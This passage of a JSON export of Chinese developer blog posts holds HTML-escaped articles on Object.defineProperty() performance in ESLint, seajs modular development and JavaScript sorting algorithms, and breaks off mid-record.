line-height: 1.5;\"\u003e\u0026quot;来一次定义俩个属性, 而不是分开定义.我的想法很简单, 每一次调用 \u0026quot;\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eObject.defineProperty()\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: small; line-height: 1.5;\"\u003e\u0026quot;都会带来很高的性能损耗, 那么为什么不一起定义呢. (译者注: 这个思想跟对HTML Dom 的修改是一个道理). 但很尴尬, 这个思想对于这个问题并无卵用. 所以我推测不是\u0026quot;\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eObject.defineProperty()\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: small; line-height: 1.5;\"\u003e\u0026quot;调用次数的原因, 而是只要它被调用了就带来这么多的损耗. (再次调用只对性能有小小的影响)\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: small; line-height: 1.5;\"\u003e我想起来当初我读\u0026quot;\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: small; line-height: normal;\"\u003eV8优化\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: small; line-height: 1.5;\"\u003e\u0026quot;得到的一些启示了, 我猜原因可能是 : 这个object在定义后又被修改了shape .\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: normal; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; background-color: rgb(249, 249, 249);\"\u003ePerhaps change the attributes of properties was enough to change the shape of the object in V8, and that was causing a less optimal path to be taken. I decided to this theory.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: normal; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; background-color: rgb(249, 249, 249);\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"outline: none; line-height: normal; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; background-color: rgb(249, 249, 249);\"\u003e我们先测试一下最初的代码\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151201/1448931050791358.png\" title=\"1448931050791358.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e正如我之前说的, 上面这个执行时间 3000ms.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px; line-height: normal;\"\u003e第一步 :　我试着把\u0026quot;\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eObject.defineProperty()\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px; line-height: normal;\"\u003e\u0026quot;移动到Node构造函数中调用, 我猜啊, 也许这样在构造函数内部定义属性或许可以避免性能损耗. 测试结果如下图:\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151201/1448931062650873.png\" title=\"1448931062650873.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e这种方法的确改善了性能（现在只要２８００ｍｓ），虽然还是比２５００ｍｓ要慢，但我们正在朝着正确的方向前进．\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e下一步，　我在想＂创建变量然后使它可枚举＂是否会比＂直接用Object.defineProperty()定义俩个可枚举的变量＂要慢？因此，我又做了一次尝试：\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e\u003cpre style=\"white-space: pre-wrap;word-wrap: break-word;line-height: 15px;margin-top: 0px;padding: 1em 1.5em;overflow-x: auto;overflow-y: hidden;border: 1px solid rgb(221, 221, 221);color: rgb(248, 248, 242);font-size: 15px;background-color: rgb(51, 51, 51)\" class=\"brush:js;toolbar:false;\"\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e//\u0026nbsp;Faster:\u0026nbsp;~2650ms\u0026nbsp;\u003cbr/\u003efunction Node() { \u0026nbsp; \u0026nbsp; \u003cbr/\u003e \u0026nbsp; \u0026nbsp;Object.defineProperties(this, { \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u003cbr/\u003e \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; start: { enumerable: false, value: pos, writable: true, configurable: true }, \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;\u003cbr/\u003e \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; end: { enumerable: false, value: pos, writable: true, configurable: true } \u0026nbsp; \u0026nbsp; \u003cbr/\u003e \u0026nbsp; \u0026nbsp;}); \u003cbr/\u003e}\u003c/span\u003e\u003c/p\u003e\u003c/pre\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003eThis version brought the ESLint performance test down even further, to around 2650ms. The easiest way to get it back down to 2500ms? Just make the properties enumerable:\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e这一次只需要２６５０ｍｓ就完成了．还有木有更快的方案了？那就让这俩个变量可枚举吧．（如下图）（这里ＮＣＺ开个玩笑，意思是我想不到还有其它更优化的方案了，　除非你允许我把这俩个变量变成可枚举的，　那也不需要本文的测试了）\u003c/span\u003e\u003c/p\u003e\u003cpre style=\"white-space: pre-wrap;word-wrap: break-word;line-height: 15px;margin-top: 0px;padding: 1em 1.5em;overflow-x: auto;overflow-y: hidden;border: 1px solid rgb(221, 221, 221);color: rgb(248, 248, 242);font-size: 15px;background-color: rgb(51, 51, 51)\"\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e//\u0026nbsp;Fastest:\u0026nbsp;~2500ms\u0026nbsp;function\u0026nbsp;Node()\u0026nbsp;{\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;this.start\u0026nbsp;=\u0026nbsp;0;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;this.end\u0026nbsp;=\u0026nbsp;0;\u0026nbsp;}\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003c/pre\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e所以，　尽量不要使用　＂Object.defineProperty()＂在我看来是最好的方案．\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003ch2 style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e\u0026nbsp;引用 :\u003c/span\u003e\u003c/h2\u003e\u003col style=\"white-space: normal; margin: 1em 1em 1em 2em; padding: 0px; font-family: Georgia, \u0026#39;Times New Roman\u0026#39;, serif; font-size: 15px; line-height: 22.5px; background-color: rgb(249, 249, 249);\" class=\" list-paddingleft-2\"\u003e\u003cli\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003ca href=\"https://github.com/eslint/espree\" style=\"cursor: pointer; color: rgb(15, 117, 202); text-decoration: underline; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003eEspree\u003c/span\u003e\u003c/a\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;(github.com)\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003ca href=\"https://github.com/eslint/eslint\" style=\"cursor: pointer; color: rgb(15, 117, 202); text-decoration: underline; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003eESLint\u003c/span\u003e\u003c/a\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;(github.com)\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003ca href=\"https://github.com/ternjs/acorn\" style=\"cursor: pointer; color: rgb(15, 117, 202); text-decoration: underline; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003eAcorn\u003c/span\u003e\u003c/a\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;(github.com)\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003ca href=\"http://mrale.ph/blog/2015/01/11/whats-up-with-monomorphism.html\" style=\"cursor: pointer; color: rgb(15, 117, 202); text-decoration: underline; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003eWhat\u0026#39;s up with monomorphism?\u003c/span\u003e\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\u003c/ol\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e",
        "createdAt": "2015-12-01T00:51:48.387Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-12-01T00:51:38.001Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;大神们遇到问题都是怎么解决的 ? Ncz几天前发表一篇文章讲述了他解决一个前端系统性能问题的方法与实践, 这个故事的大致剧情是 : 本来咱们的一个项目好好的, 突然换了一个内部的组件, 然而却带来了隐蔽的性能损耗, 然后Ncz大神一步步找出这个影响性能的原因所在.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;读后感 :\u0026nbsp;笔者读后的感觉就是为何大神能立刻意识是某某方法的问题, 这是需要时间的积累, 不过如果可以学习大牛们解决问题的方法与思维方式, 那就是这篇文章的意义了.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em; text-align: left;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151201/1448980452934130.png\" title=\"1448980452934130.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e",
        "hasContent": true,
        "is_delete": false,
        "objectId": "SGNFbbQkmz",
        "stamps": "翻译,Ncz,性能",
        "title": "每周外文精选--小心 Object.defineProperty()的性能问题",
        "types": "b1e,b7e",
        "updatedAt": "2015-12-05T03:28:02.217Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "",
        "createdAt": "2015-10-29T12:56:14.470Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-10-29T12:56:16.087Z"
        },
        "desc": "\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;本文聊聊自己使用模块开发的一点心得, 不说seajs语法.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;前端模块开发有俩个有名(我知道的..)的框架, 分别是 seajs 和 requirejs, requirejs我也简单地了解了一下, 个人觉得和seajs语法比较像.好吧, 其实是他们和Nodejs的模块引入语法比较像.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41);\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41); font-size: 14px;\"\u003e第一次接触seajs是在三个月前, 当时公司的网站的前端Js代码大都放到几个文件中, 如果某个页面的js代码特殊需要, 就直接把js代码注入在html页面中,但是后来问题来了.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41); font-size: 14px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;有的代码初期看来是为某个页面量身定制, 后来发现有的页面也需要这段代码, 好吧再把一俩百行的js代码复制到这个新的页面, 后来又有一个页面需要这段代码... \u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41); font-size: 14px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;好吧,你要吐槽了, 既然这么多页面用到这段代码, 为什么不放到全站公用的js文件中(比如我们的main.js), 可事实也就那么几个页面需要这段代码, 如果这就是这段代码加入main.js文件的理由, 那么我们的main.js早就爆炸了. \u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41); font-size: 14px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;而且, 有一个问题来了, 如果这个一俩百行js代码的模块的功能需要改变,或者有什么BUG, 那么引入这段代码的那些html页面都需要修改, 感觉整个人都不好了!\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41);\"\u003e\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0081.gif\" width=\"25\" height=\"22\" style=\"width: 25px; height: 22px;\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41);\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(73, 68, 41);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;好吧, 如果你还在为这个问题困扰, 那么是时候进行模块开发了. 我写的第一个模块就是商品滚动展示模块, 这个模块的代码大约300行,\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003e//\u0026nbsp;独立的模块js文件\u0026nbsp;\u0026nbsp;比如文件路径\u0026nbsp;\u0026nbsp;js/seajs/modules/images.roll.js\ndefine(function(require,\u0026nbsp;exports,\u0026nbsp;module){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;function\u0026nbsp;ImagesRoll()\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;...\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;ImagesRoll.prototype\u0026nbsp;=\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;...\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;};\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;module.exports\u0026nbsp;=\u0026nbsp;ImagesRoll;\n})\n\n//\u0026nbsp;如果哪个HTML页面需要这个模块,\u0026nbsp;只需要\u0026nbsp;这样调用一下就行了\nseajs.use(\u0026quot;/文件路径/js/seajs/modules/images.roll.js\u0026quot;,\u0026nbsp;function\u0026nbsp;(A)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//这里的A\u0026nbsp;就是函数\u0026nbsp;ImagesRoll\u0026nbsp;\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;调用这个模块的方法是多么的方便\u0026nbsp;!\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;A.func1();\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;A.func2();\n});\n\n//\u0026nbsp;但一位阿里的开发者对我说\u0026nbsp;:\u0026nbsp;其实这并不是好的实践方式\n//\u0026nbsp;应该在一个js文件中管理所有页面可能使用的模块(我们假定叫\u0026nbsp;gate.js)\nseajs.use(\u0026quot;/文件路径/gate.js\u0026quot;,\u0026nbsp;function\u0026nbsp;()\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;使用require(同步)\u0026nbsp;与\u0026nbsp;require.async(异步加载)\u0026nbsp;\u0026nbsp;调用相应的模块\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;同步加载\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;var\u0026nbsp;A\u0026nbsp;=\u0026nbsp;require(\u0026quot;/模块的路径\u0026quot;);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;异步加载\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;require.async(\u0026quot;/模块的路径\u0026quot;,\u0026nbsp;function\u0026nbsp;(B)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;...\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;});\n});\n\n//\u0026nbsp;我的博客目前就是使用第二种实践方式\n/*\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;但其实怎么说呢\u0026nbsp;?\u0026nbsp;第一种方式也不是毫无优点可言.比如我们的网站是转型到\u0026quot;模块开发\u0026quot;的,\u0026nbsp;因为实现的不彻底,\u0026nbsp;或者有时候要快速地实现功能,\u0026nbsp;直接这样调用也是一种不错的方式\n*/\nseajs.use(\u0026quot;/模块路径\u0026quot;,\u0026nbsp;function\u0026nbsp;(A)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;A.func()\u0026nbsp;\n});\n//\u0026nbsp;还是那句话,\u0026nbsp;适合的才是最好的.\u003c/pre\u003e\u003cp\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;那么问题来了, 模块开发有木有它的缺点呢 ?\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e有的, 就是本来一个JS文件搞定的事, 变成引入了好几个js文件.更多的文件就意味着对 服务器更大的负载 与 更高的流量.\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;不过这些缺点其实也不是什么大事, 和\u0026quot;模块化\u0026quot;带来的开发便捷相比, 已然不值一提.\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;但是...\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;如果你是个极限优化狂魔, 那么也有办法.即服务端把 一个个 模块js文件合并后输出到浏览器, 比如淘宝使用的就是这种技术. 然而具体的细节我并不清楚, 因为我们小公司也没有这样的需求驱动\u003c/span\u003e\u003cimg src=\"http://img.baidu.com/hi/youa/y_0001.gif\" width=\"46\" height=\"41\" style=\"width: 46px; height: 41px;\"/\u003e\u003c/p\u003e",
        "hasContent": false,
        "is_delete": false,
        "objectId": "Wc3yfsatJ5",
        "stamps": "seajs,模块化",
        "title": "使用seajs进行模块开发",
        "types": "b1e,b12e,b5e",
        "updatedAt": "2015-12-05T03:28:23.357Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"line-height: 1.5em;\"\u003e我把排序算法写在一个类中，参数prop只需要提供一个属性arr（待排序的数组）\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150722/1437575685142263.png\" title=\"1437575685142263.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e排序算法具体介绍，今天先不叙述了。\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e我想特地说一下这个算法，俩个元素交换值（不通过第三变量）\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003e^是js的按位异或操作符。\u003c/pre\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150722/1437575932423776.png\" title=\"1437575932423776.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cbr/\u003e\u003c/p\u003e",
        "createdAt": "2015-10-16T09:32:19.514Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-07-22T14:04:00.000Z"
        },
        "desc": "\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"color: rgb(51, 51, 51); font-family: \u0026#39;Helvetica Neue\u0026#39;, Helvetica, \u0026#39;Segoe UI\u0026#39;, Arial, freesans, sans-serif; line-height: 25.6000003814697px; widows: 1; background-color: rgb(255, 255, 255);\"\u003eJs实现--直接插入排序，希尔排序，简单选择排序，冒泡排序，快速排序\u003c/span\u003e\u003c/p\u003e\u003cp style=\"widows: 1;\"\u003e\u003cspan style=\"color:#333333;font-family:Helvetica Neue, Helvetica, Segoe UI, Arial, freesans, sans-serif\"\u003e\u003cspan style=\"line-height: 25.59375px;\"\u003e\u003ca href=\"http://www.oshjf.com/blog/iframe/sortingalgorithm/index.html\" target=\"_blank\"\u003e点击这里查看demo\u003c/a\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"widows: 1;\"\u003e时间性能分析：\u003c/p\u003e\u003cp style=\"widows: 1;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150723/1437654244945322.png\" title=\"1437654244945322.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\n",
        "hasContent": true,
        "is_delete": false,
        "objectId": "a1Qh0NWbRz",
        "stamps": "JS,算法,排序",
        "title": "JS实现多种排序算法,并分析性能\n",
        "types": "b3e,b13e",
        "updatedAt": "2015-12-05T03:28:42.493Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e其实我个人是建议问题描述得越浅显易懂越好, 这也是为什么我喜欢看国外开发者写的技术丛书.\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e但的确, 有时候我也可能用一些装x的属于来描述问题.比如下面一个故事:\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e有一天我同学看我的浏览器浏览网页是这样的...\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150912/1442018813441979.png\" title=\"1442018813441979.png\" alt=\"blob.png\" width=\"310\" height=\"427\" style=\"width: 310px; height: 427px;\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e我同学就好奇:阿杰, 你的浏览器看网页怎么是这样, 还有代码, 你是不是在黑客啊?\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e当时我的内心就是这样的...\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150912/1442019193139625.png\" title=\"1442019193139625.png\" alt=\"blob.png\" width=\"196\" height=\"171\" style=\"width: 196px; height: 171px;\"/\u003e我轻描淡写: \u0026quot;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px;\"\u003e没什么啊,打开开发者模式, 